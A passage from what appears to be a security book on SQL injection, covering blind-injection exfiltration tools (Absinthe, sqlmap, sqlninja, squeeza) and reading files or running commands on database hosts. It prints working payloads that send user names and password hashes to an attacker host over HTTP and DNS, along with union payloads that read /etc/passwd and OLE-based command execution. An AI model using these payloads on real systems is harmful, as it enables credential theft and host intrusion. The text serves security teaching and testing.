null,null,length(httpuritype(‘http://attacker/’||username||’=’||password).getclob from sys.user$ where type#=0 and length(password)=16) the access log will contain all user names and passwords from the database. lastly we can try injection i n an order by clause which is sometimes a little bit more complicated because the oracle optimizer ignores sort orders if the result is known or if only one column is present in the query: select banner from v$version order by length((select count(1) from dba_users where utl_http.request(‘www.attacker.com/’||username||‘=’||password) is not null)); produces the log entry: 192.168.2.165 - - [15/jan/2009:22:44:28 +0100] “get /sys=ad24a888fc3b1be7 http/1.1” 404 336 192.168.2.165 - - [15/jan/2009:22:44:28 +0100] “get /system=bd3d49ad69e3fa34 http/1.1” 404 339 192.168.2.165 - - [15/jan/2009:22:44:28 +0100] “get /dbsnmp=e066d214d5421ccc http/1.1” 404 339 192.168.2.165 - - [15/jan/2009:22:44:28 +0100] “get /ibo=7a0f2b316 c212d67 http/1.1” 404 337 192.168.2.165 - - [15/jan/2009:22:44:28 +0100] “get /outln=4a3ba55e08595c81 http/1.1” 404 338 192.168.2.165 - - [15/jan/2009:22:44:28 +0100] “get /wmsys=7c9ba362f8314299 http/1.1” 404 338 192.168.2.165 - - [15/jan/2009:22:44:28 +0100] “get /ordsys=7efa02ec7ea6b86f http/1.1” 404 339 192.168.2.165 - - [15/jan/2009:22:44:29 +0100] “get /ordplugins=88a2b2c183431f00 http/1.1” 404 343 icmp exfiltration just as dns can carry data in channels often overlooked by defenders, icmp too can be useful. in times past, it was not uncommon for icmp to be allowed through networks with minimal filtering and this made it an ideal choice as a tunneling mechanism. however, increasing network controls have reduced the usefulness of icmp tunnels in recent years. add to this the fact that databases do not provide the low -level interfaces to construct icmp packets directly or indirectly, and the channel loses its allure. the few sql injection tools that do support icmp channels rely on secondary helper applic ations to perform packet construction. automating blind sql injection exploitation the techniques discussed in this chapter regarding blind sql injection enable the extraction and retrieval of database contents in a highly automated manner using either inf erence techniques or alternative channels. a number of tools are available to help an attacker exploit blind sql injection vulnerabilities and information and examples are provided below for six popular tools. absinthe this gpl tool (previously known as sq lsqueal) was one of the first automated inference tools in widespread use and is thus a good starting point for examining automated blind sql injection exploitation. requirements windows/linux/mac (.net framework or mono) scenarios generic error page, controlled output supported databases oracle postgresql sql server sybase methods inference response -based binary search classic errors url www.0x90.org/releases/absinthe/ absinthe provides a handy gui that enables an attacker to extract the full contents of a database, contains enough configuration options to satisfy most injection scenarios, and can utilize both classic error methods or resp onse-based inference methods for data extraction. the response string that differentiates between two inference states must be easily identifiable for absinthe; one drawback to the tool is that the user cannot provide a customized signature for true or fal se states. instead the tool attempts to perform a diff on a true and false request, and this causes the tool to fail in cases where the page includes other data not influenced by the inference question. one example is in search pages that echo the search string back in the response. if two separate but equivalent inference exploits are provided, the two responses will each contain a unique search string rendering the diff meaningless. there is a tolerance one can adjust, but this is not as efficient as providing signatures. figure 5.11 shows the main absinthe screen. first, the injection type is selected, either blind injection or error based , after which the database is chosen from a list of supported plugins. the target url is then entered along with whether the request is formatted as a post or get. finally, each parameter that should be contained in the request is entered in the name textbox along with a default value . if the parameter is susceptible to sql injection, then the injectable parameter checkbox should be selected, as should the treat value as string checkbox if the parameter is of type string in the sql query. do not forget to add in all parameters needed for the vulnerable page to process the request; this includes hidden fields such as __viewstate on .net pages. once the configuration is complete, click initialize injection . this sends a bunch of test requests in order to determine the response difference that the inference will be based on. if no err ors are reported, then click on the db schema tab, which displays two active buttons: retrieve username and load table info. the first button will retrieve and display the database login used by the vulnerable page and the second button will retrieve a lis t of user -defined tables from the current database. once table information has been loaded, click on a table name in the tree view of database objects and click load field info, which will retrieve a list of all column names in the selected table. as soon as that has been completed, click on the download records tab, provide an output filename in the filename textbox, select the columns you wish to retrieve by clicking on the column name and then clicking add , and finally click on download fields to xml . this will dump the selected columns to the output file, producing an xml document containing all rows from the selected columns in the target table. figure 5.11 absinthe v1.4.1 configuration tab bsql hacker the next tool under examination utilizes a number of inference techniques to enable the attacker to extract database contents and is experimental in its appr oaches: although still in beta there are numerous nifty features. requirements windows (.net framework) scenarios generic error page, controlled output generic error page, uncontrolled output completely blind, no errors supported databases access mysql oracle sql server methods inference time -based modified binary search inference response -based modified binary search classic errors url http://labs.portcullis.co.uk/application/bsql -hacker/ bsql hacker is a graphical gpl tool designed to make exploitation of blind sql injection vulnerabilities trivial by separating attac k templates from the injection strings required to extract particular items from the database. it comes with templates for different types of blind sql injection attacks against the supported databases and also stores exploits to extract interesting data f rom the databases. the tool is designed to be used by novices and experts alike; an injection wizard is provided for the former that attempts to figure out all the details of a vulnerability and for the latter full control over the exploit string is provided. at the time of writing bsql hacker is still in beta and the tool is not completely stable. the injection wizard did not correctly derive a working exploit in most scenarios tested by the author and the automated injection mode did not work for oracle o r mysql, and only partially for sql server. given the vicarious nature of real -world vulnerabilities the tool makes a decent effort to help out the attacker, however sometimes exploitation is only achievable with human insight. other minor nuisances include memory bloat and a crowded interface that has inter -dependent options in different locations, but all in all the tool does support a large number of attack techniques against several popular databases and its multi threaded model speeds up injection atta cks. after loading the tool, click file | load which brings up a file selection dialog containing a list of template files for various databases. each file contains a template for a specific technique, e.g. template -blind -oracle is used for a blind attack against an oracle database. select the file matching your database; if a second dialog is loaded then enter the full url of the vulnerable site including get parameters and click ok . the target url textbox on the dashboard tab will be populated with the attack template that was loaded from file. edit the target url such that the attack template fits the vulnerable page. for instance, when loading the blind- oracle template, the target url textbox contains the url: http://www.example.com/example.php?id=100 and nvl(ascii(substr(({injection}),{position},1)),0){operation}{char}-- any strings within “{}” are “magic variables” that are replaced at runtime by bsql hacker. for the most part we can leave these alone; instead we will change the url from www.example.com to the vulnerable site along with the get parameters (for post requests use the same request string except place the parameters and their values in the post data table on the request & injection tab): http://www.victim.com/ora- nondba-exception.jsp?txt_search=madbob’ and nvl(ascii(substr((select user from dual),{position},1)),0){operation}{char}-- notice that we replaced {injection} with “select user from dual” in addition to the other changes; the oracl e injection template was flawed so it was only possible to issue specific queries. once the url is configured, select oracle from the dropdown list in the toolbar ( figure 5.12). if the inference method is not response -based, then further configuration can be performed on the detection tab. otherwise, bsql hacker will attempt to determine the difference in responses automatically. this automated detection suffers from the same limitations as absinthe, but bsql hacker will also accept user -supplied signatures, unlike absinthe. figure 5.12 selecting bsql hacker database plugin now that all configuration tasks have been performed, it is time to verify the settings; after clicking on test injection a dialog should display an “injection succeed.” message. if not, verify that the correct database is selected in the dropdown list and ensure the exploit string correctly completes the original sql query. requests and responses can be reviewed in the reque st history pane. assuming all settings are correct, deselect the automated attacks button as these attack strings are flawed; in any case we are just interested in the database login. finally, click on the start button which will execute the attack and pri nt the extracted data into the status pane of the dashboard as shown in figure 5.13. although bsql hacker attempts to extract database schemas and contents automagically, this feature was lacking reliability and the tool seems best suited for specific queries. figure 5.13 extracting database login using bsql hacker sqlbrute attackers who are comfortable with the fundamentals behind inference attacks use this command line tool due to its lightweight nature and straightforward syntax. requirements python (windows / linux / mac) scenarios generic error page, controlled output generic error page, uncontrolled output completely blind, no errors supported databases oracle sql server methods inference time -based binary search inference response -based modified binary search url www.gdssecurity.com/l/t.php sqlbrute relies only on a python interpreter and at 31k is tiny compared to the other tools examined. this makes it ideal for focused injection scenarios or where file size is important; its thread support boosts speed. a drawback is that it uses a fixed a lphabet from which inference tests are drawn; if a byte in the data is not contained within the alphabet then it cannot be retrieved, which limits the tool to text- based data. in order to run the tool, you will need the full path to the vulnerable page along with any data that must be submitted (either get or post parameters). if using the response -based mode then a regular expression must be supplied in the -- error argument to the tool that indicates when the inference question returns false, otherwise the timing -based mode is available. in the example depicted in figure 5.14, sqlbrute has been run in response -based mode against a vulnerable sql server, and two table names have been extracted from the database. based on our exploring, we know that when inference question returns false, the page contains “review count:0”, but t his could also be a regular expression instead of a fixed string if needed. after execution commences the tool performs a little bit of fingerprinting and starts to extract data and print it to screen. figure 5.14 running sqlbrute sqlbrute is best suited to experienced users who favor simplicity and un- obfuscated operation. sqlmap requirements python 2.6+ scenarios generic error page, controlled output generic error page, uncontrolled output completely blind, no errors supported databases firebird microsoft access microsoft sql server mysql oracle postgresql sap maxdb sqlite sybase methods inference time -based binary search inference response -based modified binary search alternative channels: icmp url http://sqlmap.sourceforge.net/ sqlmap is a very interesting tool that has seen strong growth in recent years. where other tools tend to focus on exploiting sql injection, sqlmap devotes significant effort toward automated discovery of vulnerabilities in addition to exploitation of discovered vulnerabilities. since the detection is heuristic -based, mistakes of the false positive and false negative variety are to be expected. however, for a quick check sqlmap works well. in our example, a vulnerable page has already been identified and we wish to exploit it with sqlmap. the first step is to let the tool figure out an exploit string by aiming sqlmap at a vulnerable url along with post data (if any): sqlmap.py -u ‘http://www.victim.com/vuln.aspx’ --level 5 --technique=b --dbms=mssql --data “__viewstate=ddwtmtcxmdqzntqymds7pv9sqh6luxcmzs8n6slvxtadr4nf&m_search=e%25&_ctl3=search” a quick explanation on the parameters: --level configures sqlmap to use every possible exploit string in its library, -- technique limits strings to blind inference only , --dbms informs sqlmap that the database is sql server and -- data supplies post variables. setting the level and database ensures a more accurate exploit string; sqlmap misidentifies databases when exploits work across databases. when run, sqlmap will tes t every parameter in the post variable (or get variables, should they be present). if you already have the vulnerable parameter’s name, then it can be supplied with - p. after the first run, sqlmap will attempt to detect the injection point and write out th e successful exploit string to its session file. review this file and ensure that the detected database matches your expectation, it sometimes confuses databases which could catastrophically impact the generated exploit. once the injection point and exploi t has been identified and written to the session file, subsequent invocations of sqlmap can automate data extraction. for example, to get a list of users add the --users flag, to get a list of databases use the --dbs , --tables for tables in a database, --passwords for user password hashes and, lastly, --dump and --dump -all for retrieving tables content. sqlmap supports both blind inference exploits as well as timing -based inference shown in this chapter, as well as exploitation techniques discussed throughout this book. run sqlmap -h for more options. sqlninja without going through the rest of this tool’s prodigious capabilities, sqlninja does support command execution using dns as a return channel on sql server installations and we concentrate on that featu re. requirements perl and a number of perl modules (linux) scenarios generic error page, controlled output generic error page, uncontrolled output completely blind, no errors supported databases sql server methods inference time -based binary search alternative channels: dns, icmp url http://sqlninja.sourceforge.net/ although sqlninja has already been covered in chapter 4 the alternative dns channel was not. implementation of the channel is accomplished by first uploading an executable helper program onto the vulnerable database’s os. once in place, the helper application is called using xp_cmdshell; it is passed a domain name (e.g. blah.attacker.com for which the attacker’s ip address is an authoritative dns server) and provided with a command to execute. the helper executes the command, captures the output, and initiates dns lookups by prefixing the supplied domain with the output. these dns queries will arrive at the attacker’s address and are decoded by sqlninja and displayed. sqlninja includes a standalone dns server component which answers queries for the purposes of eliminating timeouts. figures 5.15 and 5.16 show sqlninja uploading the dns helper program, and then using dns to retrieve the sql server’s account name by running using the ‘whoami’ command. since sqlninja relies on both xp_cmdshell and file creation, privileged database access is a must. figure 5.15 uploading sqlninja’s dns helper figure 5.16 executing sqlninja to extract a username via dns sqlninja also ships with an icmp alternative c hannel that similarly relies on an uploaded helper program to create custom icmp packets that carry returned data. squeeza the final tool examined for automating blind sql injection exploitation, squeeza is a command line tool that supports multiple method s for extracting information from sql server database, with particular emphasis placed on the dns channel where a reliability layer is added. requirements ruby tcpdump for dns channel (linux / mac) authoritative dns server for any domain scenarios generic error page, controlled output generic error page, uncontrolled output completely blind, no errors supported databases sql server methods inference time -based bit -by-bit alternative channel: dns url www.sensepost.com/research/squeeza squeeza takes a slightly different approach to sql injection in general by dividing injection up into data creation (e.g. command execution, file from database’s file -system, or a sql query) and data extraction (e.g. using classic errors, timing inference, and dns). this enables the attacker to mix and match to a large degree: command execution using timing as the return channel, or file copy over dns. we will focus solely on the dns extraction channel combined with command execution for data generation for brevity’s sake. squeeza’s dns channel is handled entirely in t -sql meaning that there is no requirement for privileged database access (where privileged access is available, it is used as this speeds up extraction). obviously, when data are generated via command execution then privileged access is required likewise for file copying. squeeza also makes every attempt to be reliable in the face of unpredictable udp dns packets and has a transport layer that ensures that all data arrive. it can also handle ver y long fields (up to 8000 bytes) and can extract binary data. settings are stored in a configuration file for persistence and the minimum details required: web server ( host), a path to the vulnerable page ( url), any get or post parameters (querystring ) and whether the request is a get or post ( method ). inside the querystring, the marker x_x_x_x_x_x is used to locate where injection strings are placed. figure 5.17 is a screenshot showing squeeza returning a directory li sting via dns. figure 5.17 squeeza returning a directory listing summary understanding and exploiting blind sql injection is what separates regular attackers from the pros. in the face of a defense as trivial as disabling verbose error messages, most script kiddies move onto the next target. however, blind sql injection vulnerabilities provide just as much possible ownage through a range of techniques that allow the attacker to utilize timing, responses, and alternative channels such as dns to extract the data. by asking a simple question in the shape of a sql query that returns either true or false and repeati ng thousands of times, the keys to the database kingdom are ours. blind sql injection vulnerabilities are often missed because they hide in the shadows. once discovered, a range of possible exploits is at your fingertips. know when to choose response based exploits as opposed to timing exploits and when to haul out the heavyweight alternative channel tools; this fine -grained knowledge will save you time. given how highly prone to automation most blind sql injection vulnerabilities are, a wide variety of too ls are available to both the novice and expert covering graphical as well as command line tools with a wide spectrum of supported databases. with the basics of sql injection and blind sql injection behind us, it is time to move onto the business of further exploitation: what happens once a comfortable injection point is identified and exploited? can we move onto exploiting the underlying operating system? find out in chapter 6 ! solutions fast track finding and confirming blind sql injection • invalid data returns a generic error message rather than a verbose error, so sql injection can be confirmed by inducing side -effects such as a timed delay. you can also split and balance a parameter; if a numeric field contains 5 th en submit 2 + 3 or 6 − 1, if a string parameters contains “madbob” then submit ‘mad’||‘bob’ • consider the attribute of the vulnerability: can any errors be force and is any of the content on a non- error page controllable? • a single bit of information can be inferred by asking a question in sql whether the bit is 1 or 0 and a number of inference techniques accomplish this. using time -based techniques • data can either be extracted through a bit -by-bit method or via a binary search method with delays indicating the value. delays are introduced either with explicit sleep() -type functions or through the use of long- running queries. • mostly time is used as an inference method on sql server and oracle; mysql is less reliable and the mechanisms are more prone to failure. • time is inherently unreliable as an inference method, but we can improve that by increasing the timeouts or by with other tricks. using response -based techniques • data can either be extracted through a bit -by-bit method or via a binary search method with response content indicating the value. typically existing queries have a clause inserted that keeps the query as -is or returns no results based on the inferred value. • technique can be used with great success on a wide variety of databases. • in some cases it may be possible to return more than 1 bit of information per request. using alternative channels • out -of-band communication has the a dvantage that data can be extracted in chunks rather than in bits, providing a noticeable speed improvement. • most common channel is dns, where an attacker persuades the database to perform a name lookup containing a domain name controlled by the attacker prefixed by a piece of data that is to be extracted. when the request arrives at the dns name server, the attacker views that data. other channels are http and smtp. • support for alternative channels is highly database specific and the number of tools that support alternative channels is significantly lower than those that support inference. automating blind sql injection exploitation • absinthe’s strength is its support for database mapping and retrieval through error and response -based inference exploit s against a number of popular databases, both commercial and open source. the handy gui is a nice touch but the lack of signature support limits its effectiveness. • bsql hacker is another graphical tool that uses both time - and response -based inference techniques as well as classic errors to extract items from the database in question. although still in beta and therefore unstable, the tool has promise and provides many opportunities for fiddling. • sqlbrute is the tool for command line users who have a fi xed vulnerability they wish to exploit using either time or response -based inference. • sqlmap combines discovering with exploitation into a powerful tool that supports both time - and response -based inference methods, as well as an icmp alternative channel . it has seen rapid growth and is actively developed. • sqlninja, among a number of features, supports a dns -based alternative channel for remote command execution that works by first uploading a custom binary wrapper and then executing the command via the uploaded wrapper. the wrapper captures all output from the command and initiates a sequence of dns requests containing the encoded output. • squeeza takes a different look at sql injection, splitting data creation from data extracting. this command line t ool can extract time either through time -based inference, classic errors or dns. the dns channel is performed entirely through t -sql and thus does not require an uploaded binary. frequently asked questions q:i’m getting an error when i submit a single quot e, is this a blind sql injection vulnerability? a: not necessarily. it might be, but then it might just as well be the application detecting invalid input and printing an error before the quote ever touches a database. it is a first sign; after this use th e split and balance techniques or queries that introduce side -effects to confirm. q: i’ve got an oracle vulnerability. can i use timing as an inference technique? a: yes, the dbms_pipe.recieve_message function can be embedded in sql statements, and other useful functions likely exist. q: are there tools that use http or smtp as exfiltration channels? a: pangolin supports http exfiltration to a nominated web server; data are retrieved either from the server logs or by writing a simple collecting application. smtp requires fairly specific conditions in order to be used as an exfiltration channel and tool authors probably have not yet seen a need for its support. q: using dns as an exfiltration channel means i have to get my own domain and name server! a: stop being cheap! a couple of dollars a month will get you a virtual server and a domain which is all you need and once you taste the sweet, sweet nectar that is dns -carried data then those dollars appear insignificant. chapter 6 exploiting the operating s ystem sumit siddharth solutions in this chapter: • accessing the file system • executing operating system commands • consolidating access introduction one of the things mentioned in the introduction to chapter 1 was th e concept of utilizing functionality within the database to access portions of the operating system. most databases ship with a wealth of useful functionality for database programmers, including interfaces for interacting with the database, or for extendin g the database with user -defined functionality. in some cases, such as for microsoft sql server and oracle, this functionality has provided a rich hunting ground for security researchers looking for bugs in these two database servers. in addition, a lot of this functionality can also be employed as exploit vectors in sql injections ranging from the useful (reading and writing files) to the fun but useless (making the database server speak). in this chapter, we will discuss how to access the file system to p erform useful tasks such as reading data and uploading files. we will also discuss a number of techniques for executing arbitrary commands on the underlying operating system, which could allow someone to extend his reach from the database, and conduct an a ttack with a much wider scope. before we begin, it is a good idea to discuss why someone would be interested in going down this rabbit hole at all. the ostensible answer, of course, is the universal one: because it is there. beyond the trite sound byte, however, there are several reasons why someone would want to use sql injection to attack the host. for instance, attacking the base host may allow the attacker to extend his reach. this means that a single application compromise can be extended to target oth er hosts in the vicinity of the database server. this ability to use the target database server as the pivot host bears promise, especially since the database server has traditionally resided deep within the network in what is most often a “target -rich” en vironment. using sql injection attacks to target the underlying host is also attractive because it presents an attacker with the somewhat rare opportunity to slide into a crevice where the lines between traditional, unauthenticated, and authenticated attac ks reside. overburdened system administrators and database administrators (dbas) will often prioritize patching based on whether a vulnerability can be exploited by an anonymous user. in addition, exploits that require an authenticated user are sometimes p ut on the back burner while other, more urgent fires receive attention. an attacker exploiting an sql injection bug effectively transforms his role from that of the unauthenticated anonymous user to the authenticated user being used by the application for the database connection. we will examine all of these cases both in this chapter and in chapter 7 . tools & traps... the need for elevated privileges in chapter 4 , we discussed the methods that a person can employ to elevate his privileges through sql injection attacks. many of the attacks that are aimed at compromising the underlying operating system require that the sql user is running with elevated privileges. s uch elevation was not necessary in the early days, when the principle of least privilege was less understood and when every application connected to the back -end database with full dbsysadmin privileges. for this reason, most automated sql injection toolk its provide the ability to identify the current user’s privilege level as well as multiple methods for possibly elevating him from a standard database user to a database super user. accessing the file system accessing the file system of the host running the database management system (dbms) holds several promises for the potential attacker. in some cases, this is a precursor to attacking the operating system (e.g. finding stored credentials on the machine); in other cases, it could simply be an attempt to bypass the authorization efforts of the database itself (e.g. mysql traditionally stored its database files in ascii text on the file system, allowing a file -read attack to read database contents sans the dbms authorization levels). reading files the ability to read arbitrary files on the host running the dbms offers interesting possibilities for the imaginative attacker. the question of “what files to read?” is an old one that attackers have been asking for a long time. the answer obviously depends largely on the attacker’s objectives. in some cases the goal may be theft of documents or binaries from the host, whereas in other cases the attacker may be hoping to find credentials of some sort to further his attack. regardless of the goal, the attacker wants to be able to read both ascii text and binary files somehow. an obvious question that naturally follows is how the attacker is able to view these files, assuming he is able to coerce the dbms into reading it. although in this chapter we will examine a few of the answers to these questions, we covered these methods extensively in chapters 4 and 5. simply put, the goal of this subsection is to understand how an attacker can view the contents of the target file system as part of an sql query. actually extruding the data is a different problem to be solved. mysql mysql provides the well -abused functionality of allowing a text file to be read into the database through its load data infile and load_file commands. according to the current mysql reference manual, “the load data infile statement reads rows from a text file into a table at a very high speed. the filename must be given as a literal string.” let’s examine the use of the load data infile command as it is intended to be used. we’ll start by creating a simple text file called users.txt: cat users.txt sumit siddharth sumit.siddharth@fakedomain.com 1 dafydd stuttard mail@fakedomain.net 1 dave hartley dave@fakedomain.co.uk 1 rodrigo marcos rodrigo@fakedomain.com 1 gary oleary- steele garyo@fakedomain.com 1 erlend oftedal erlend@fakedomain.com 1 marco slaviero marco@fakedomain.com 1 alberto revelli r00t@fakedomain.net 1 alexander kornbrust ak@ fakedomain.com 1 justin clarke justin@fakedomain.com 1 kevvie fowler kevviefowler@fakedomain.com 1 then we’ll run the following command within the mysql console to create a table to house the author details: mysql> create table authors (fname char(50), sname char(50), email char(100), flag int); query ok, 0 rows affected (0.01 sec) with the table ready to accept the text file, we’ll populate the table with the following command: mysql> load data infile ‘/tmp/users.tx t’ into table authors fields terminated by ’’; query ok, 11 rows affected (0.00 sec) records: 11 deleted: 0 skipped: 0 warnings: 0 a quick select on the authors table reveals that the text file has been perfectly imported into the database: mysql> select ∗ from authors; +-----------+ ---------------+ ------------------------------+ -----+ | fname | sname | email | flag| +-----------+ ---------------+ ------------------------------+ -----+ | sumit | siddharth | sumit.siddharth @fakedomain.com| 1 | | dafydd | stuttard | mail@fakedomain.net | 1 | | dave | hartley | dave@fakedomain.co.uk | 1 | | rodrigo | marcos | rodrigo@fakedomain.com | 1 | | gary | oleary- steele | garyo@fakedomain.com | 1 | | erlend | oftedal | erlend@fakedomain.com | 1 | | marco | slaviero | marco@fakedomain.com | 1 | | alberto | revelli | r00t@fakedomain.net | 1 | | alexander | kornbrust | ak@fakedomain.com | 1 | | justin | clarke | justin@fakedomain.com | 1 | | kevvie | fowler | kevviefowler@fakedomain.com | 1 | +-----------+ ---------------+ ------------------------------+ ------+ 11 rows in set (0.00 sec) for easier hacking fun, mysql also provides the load_file function, which allows you to avoid first creating a table, and goes straight to delivering the results: mysql> select load_file(‘/tmp/test.txt’); +--------------------------------------------------------------------------+ | load_file(‘/tmp/test.txt’) | +--------------------------------------------------------------------------+ | this is an arbitrary file residing somewhere on the filesystem it can be multi- line and it does not really matter how many lines are in it... | +-------------------------------------------------------------------------+ 1 row in set (0.00 sec) now, since t he focus of this book is sql injection , it would probably make sense to observe this within an injected sql statement. to test this, consider the fictitious and vulnerable intranet site (shown in figure 6.1) that allow s a user to search for customers. figure 6.1 sample vulnerable intranet application the site is vulnerable to injection, and since it returns output directly to your browser it is a prime candidate for a union statement. for purposes of illustration, this site also displays the actual generated sql query as a debug message. the results of a simple search for “a” appear in figure 6.2. figure 6.2 searching for “a” now we’ll consider the load_file syntax we examined earlier. we’ll try to use the union operator to read the world- readable /etc/passwd file, using the following code: ‘ union select load_file(‘/etc/passwd’)# this returns the familiar error message regarding the union operator requiring an even number of columns in both queries: dbd::mysql::st execute failed: the used select statements have a different number of columns at... by adding a second column to the unionized query, we effectively obtain joy by submitting the following: ‘ union select null,load_file(‘/etc/passwd’)# this behaves as we had hoped, and as figure 6.3 shows, the server returns all the users in the database, along with the contents of the file we requested. figure 6.3 reading /etc/passwd through the database keep in mind that accessing the file system this way requires that the database user has file privileges and that the file being read has world -readable permissions. the syntax of the load_file command necessitates that the attacker use the single- quote character (‘), which sometimes poses a problem due to possible malicious character filtering within the application. chris anley of ngs software pointed out in his paper “hackproofing mysql” that mysql’s ability to treat hex -encoded strings as a substit ute for string literals means that the following two statements are equivalent: select ‘c:/boot.ini’ select 0x633a2f626f6f742e696e69 you will find more information on such encoding attacks in chapter 7 . the load_file function also handles binary files transparently, which means that with a little bit of finesse we can use the function to read binary files from the remote host easily: mysql> create table foo (line blob); query ok, 0 rows affected (0.01 sec) mysql> insert into foo set line=load_file(‘/tmp/temp.bin’); query ok, 1 row affected (0.00 sec) mysql> select ∗ from foo; +--------+ | line| +--------+ | aa??a| +--------+ 1 row in set (0.00 sec) of course, the binary data are not viewable, making it unusable to us, but mysql comes to the rescue with its built- in hex() function: mysql> select hex(line) from foo; +--------------+ | hex(line)| +--------------+ | 414190904112| +--------------+ 1 row in set (0.00 sec) wrapping the load_file command in the hex() function also works, allowing us to use the vulnerable intranet application to now read binary files on the remote file system: ‘ union select null,hex(load_file(‘/tmp/temp.bin’))# the results of this query appear in figure 6.4. figure 6.4 reading binary files you can use the substring function to split this, effectively obtaining chunks of the binary file at a time to overcome limitations that the application might impose. load_file() also accepts universal naming convention (unc) paths, which allow an enterprising attacker to search for files on other machines, or even to cause the mysql server to connect back to his own machine: mysql> select load_file(‘//172.16.125.2/temp_smb/test.txt’); +----------------------------------------------- + | load_file(‘//172.16.125.2/temp_smb/test.txt’)| +----------------------------------------------- + | this is a file on a server far far away..| +----------------------------------------------- + 1 row in set (0.52 sec) the sqlmap tool by bernardo damele a.g. ( http://sqlmap.sourceforge.net ) offers this functionality through the --read -file command -line option: python sqlmap.py -u “term=a”http://intranet/cgi- bin/customer.pl?submit=submit&term=a” -read-file /etc/passwd microsoft sql server microsoft sql server is one of the flagship products of the microsoft security development lifecycle (sdl) process, but it still has a well -deserved bad rap with regard to sql injection attacks. this is due in part to its popularity among first -time develo pers (a testimony to how microsoft enables its developers) and in part to the fact that the microsoft sql server allows for stacked queries. this exponentially increases the options available to a potential attacker, which can be evidenced by the repercuss ions of an injection against an sql server box. sensepost alone has built tool sets that will convert an injection point into full- blown domain name system (dns) tunnels, remote file servers, and even transmission control protocol (tcp) connect proxies. let’s begin at the beginning, and try to use a vulnerable web application to read a file from the remote sql server. in this case, usually the first function of an attacker who has managed to obtain system administrator privileges finesse is the bulk insert statement. a quick test through microsoft’s sql query analyzer (shown in figure 6.5) demonstrates the use of bulk insert by way of example. figure 6.5 a bulk insert inside sql query analyzer the ability of the relational database management system (rdbms) to handle files such as this, along with the ability to handle batche d or stacked queries, should make it fairly obvious how an attacker can leverage this through his browser. let’s take one more look at a simple search application written in asp with a microsoft sql server back end. figure 6.6 shows the results of a search on the application for “%.” as you should expect (by now), this returns all the users on the system. figure 6.6 a sample intranet application (with a microsoft sql server back end) once the attacker has determined that the sname field is vulnerable to injection, he can quickly determine his running privilege level by injecting a union query to select user_name() , user, or loginame : http://intranet/admin/staff.asp?sname= ’ union select null,null,null,loginame from master..sysprocesses where spid = @@spid-- this results in figure 6.7 . figure 6.7 confirming the injection with this information he moves on, effectively replicating the commands he executed within the query analyzer program through the browser, leaving the following odd- looking query: http://intranet/admin/staff.asp?sname= ’; create table hacked(line varchar(8000)); bulk insert hacked from ‘c:\\ boot.ini’;-- this allows the attacker to run a subsequent query to obtain the results of this newly created table (displayed in figure 6.8). figure 6.8 reading a file through microsoft sql server of course, not every application will return results in such a convenient fashion, but once the bulk insert has been done, an attacker can use any of the extrusion methods covered in chapters 4 and 5 to extract these data from the database. by setting codepage=’raw’ when doing a bulk insert an attacker can even upload binary files into sql server, which he can rebuild after extracting it t hrough the application. sensepost’s squeeza tool automates this process through the use of its !copy mode, enabling an attacker to perform the bulk insert in a temporary table in the background, and then use the communication mechanism of choice (dns, error messages, and timing) to extract the information before rebuilding the file on his machine. you can test this by picking an arbitrary binary file on the remote machine (c: \\winnt \\system32 \\net.exe) and obtaining its md5 hash value. figure 6.9 shows the hash value obtained for the system’s net.exe binary. figure 6.9 an md5 hash of net.exe using a squeeza.config file that is aimed at our target application, let’ s fetch two files: the remote server’s boot.ini and the binary c: \\winnt \\system32 \\net.exe. figure 6.10 displays the rather terse output from squeeza. figure 6.10 copying a binary from the remote server if all went well, we should be able to read the contents of the stolen- boot.ini and compare the checksum on the stolen- net.exe: [haroon@hydra squeeza]$ cat stolen -boot.ini [boot loader] timeout=30 default=multi(0)disk(0)rdisk(0)partition(1)\\ winnt [operating systems] multi(0)disk(0)rdisk(0)partition(1)\\ winnt=“microsoft windows 2000 server” /fastdetect [haroon@hydra squeeza]$ md5sum stolen- net.exe 8f9f01a95318fc4d5a40d4a6534fa76b stolen- net.exe (you can compare the md5 values to prove that the file transfer worked perfectly, albeit painfully slowly depending on the !channel you chose.) in the absence of the bulk insert method, an attacker can accomplish file manipulation on sql server through the use of ole automation, a technique discussed in chris anley’s paper, “advanced sql injection.” in anley’s example, he first used the wscript.shell object to launch an instance of notepad on the remote server: -- wscript.shell example (chris anley –chris@ngssoftware.com) declare @o int exec sp_oacreate ‘wscript.shell’, @o out exec sp_oamethod @o, ‘run’, null, ‘notepad.exe’ of course, this opens the opportunity for an attacker to use any activex control, which creates a wealth of attacking opportunities. the file system object provides an attacker with a relatively simple method to read files in the absence of bulk insert. figure 6.11 shows the (ab)use of the scripting.filesystemobject within sql query analyzer. figure 6.11 browsing the file system using scripting.filesystemobject using the same technique, it is then possible to get sql server to spawn browser instances, which adds a new twist to the chain with ever more complications and attack vectors. it is not impossible to imagine an attack in which the attacker exploits a vuln erability in a browser by first using sql injection to force the server’s browser to surf to a malicious page. sql server 2005 introduced a wealth of new “features” that are attack -worthy, and probably one of the biggest is the introduction of the microsoft common language runtime (clr) within sql server. this allows a developer to integrate .net binaries into the database trivially, and for an enterprising attacker it opens up a wealth of opportunities. from msdn: “microsoft sql server 2005 significantly enhances the database programing model by hosting the microsoft .net framework 2.0 common language runtime (clr) . this enables developers to write procedures, triggers, and functions in any of the clr languages, particularly microsoft visual c# .net, microsoft visual basic .net, and microsoft visual c++. this also allows developers to extend the database with new ty pes and aggregates.” ( rathakrishnan et al .) we will get into the meat of this clr integration later, but for now our focus is simply on abusing the remote system to read in files. this becomes possible through one of t he methods used to import assemblies into sql server. the first problem we need to overcome is that sql server 2005 disables clr integration by default. as figure 6.12 shows, this proves to be no problem once you have system administrator or equivalent privileges, since you can turn on all of this functionality again through the sp_configure stored procedure. figure 6.12 enabling clr integration of course (as you can see in figure 6.13 ), it’s just as easy to adapt all of these to run through our injection string. figure 6.13 enabling clr integration through an application this positions us to load any .net binary from the remote server into the database by using the create assembly function. we’ll load the .net assembly c: \\temp \\test.exe with the following injection string: sname=’;create assembly sqb from ‘c:\\ temp\\test.exe’ with permission_set = unsafe-- sql server stores the raw binary (as a hex stri ng) in the sys.assembly_files table. as shown in figure 6.14, you can view this easily within query analyzer. figure 6.14 viewing the attached file within the database viewing this file through our web page requires that we combine the substring() and master.dbo.fn_varbintohexstr() functions: sname=’ union select null,nul l,null, master.dbo.fn_varbintohexstr (substring(content,1,5)) from sys.assembly_files -- figure 6.15 shows how you can use the union, substring, and fn_varbintohexstr combination to read binary files through the browser. figure 6.15 reading binary files using fn_varbintohex str and substring sql server verifies the binary or assembly at load time (and at runtime) to ensure that the assembly is a valid .net assembly. this prevents us from using the create 